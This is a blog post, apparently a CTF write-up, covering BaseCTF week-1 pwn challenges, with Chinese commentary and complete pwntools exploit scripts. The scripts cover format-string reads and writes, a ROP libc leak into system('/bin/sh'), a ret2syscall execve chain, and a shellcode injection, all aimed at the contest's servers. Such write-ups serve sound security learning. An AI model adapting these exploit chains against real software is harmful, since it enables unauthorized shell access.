---
layout: post
title: "BaseCTF-Week1"
date: 2024-7-10
tags: [pwn]
comments: true
author: gbeefee

---

###### 0x0  format_string_level0

flag文件已经打开，找到偏移，读取即可

`%8$s`

###### 0x1 format_string_level2

任意地址写，使用fmtpayload实现

```
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

#io = process('./pwn')
io = remote('challenge.basectf.fun',37214)
target_addr = 0x4040B0

payload = fmtstr_payload(6,{target_addr:1})

io.send(payload)
io.interactive()
```

###### 0x2 她与你皆失

这会明白命名规则了，没有binsh，也没有system，属于泄露libc地址

```
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

elf=ELF('./pwn')
libc =ELF('./libc.so.6')
#io = process('./pwn')
io = remote('challenge.basectf.fun',37831)

bss = 0x0404040
pop_rdi = 0x401176
pop_rdx = 0x401221
pop_rsi = 0x401178
ret= 0x40101a
main_addr =0x4011df
read_plt=elf.plt['read']
read_got=elf.got['read']
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

payload1 = b'a'*10 + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

io.sendafter(b'do?\n', payload1)

puts_addr = u64(io.recvuntil('\x7f').ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base =  puts_addr - libc.sym['puts'] 
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

payload2 = b'a'*10 + p64(0) +p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

io.sendafter(b'do?\n', payload2)

io.interactive()

```

###### 0x3 gift

是的，这是一份礼物，静态链接库，可以采用ret2syscall或者mprotect两种解法，这里是ret3syscall，值得注意的是，不管是哪种解法，都要构造两次输入，也就是先写入binsh再syscall，不能再一个payload里输完，和xyctf那次有点区别

```
from pwn import *

context(arch='amd64', os='linux',log_level='debug')

io=remote('challenge.basectf.fun',31920)
#io = process('./pwn')
elf=ELF('./pwn')

mprotect_addr = 0x448440
read_addr = 0x447700
bss  = 0x4c72c0
main = 0x40184a
pop_rdi = 0x0000000000401f2f
pop_rsi = 0x0000000000409f9e
ret = 0x0000000000449cb9
pop_rax = 0x0000000000419484
pop_rdx_rbx=0x000000000047f2eb
syscall=0x0000000000401ce4

payload=b'a'*0x28+\
    p64(pop_rsi)+p64(bss)+\
    p64(pop_rdi)+p64(0)+\
    p64(pop_rdx_rbx)+p64(0x100)+p64(0)+\
    p64(read_addr)+p64(ret)+p64(main)
payload2=b'a'*0x28+\
    p64(pop_rax)+p64(0x3b)+\
    p64(pop_rdi)+p64(bss)+\
    p64(pop_rsi)+p64(0)+\
    p64(pop_rdx_rbx)+p64(0)+p64(0)+\
    p64(syscall)

io.sendlineafter(b'same\n',payload)
io.sendline(b'/bin/sh\x00')
io.sendlineafter(b'same\n',payload2)

io.interactive()
```

###### 0x4 ret2shellcode1

抽象，暂时没想到

wp出来了，原来是这样，第一次调用完后，寄存器发生了些微的变化，可以再次调用read，而且不再是只能写入2bytes，第二次输入就可以顺利写入shellcode了。

```
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

io = process('./pwn')
#io = remote('challenge.basectf.fun','28285')

sc = asm('syscall')
io.send(sc)
sc = b'\x90'*2 + asm(shellcraft.sh())
io.send(sc)
io.interactive()
```

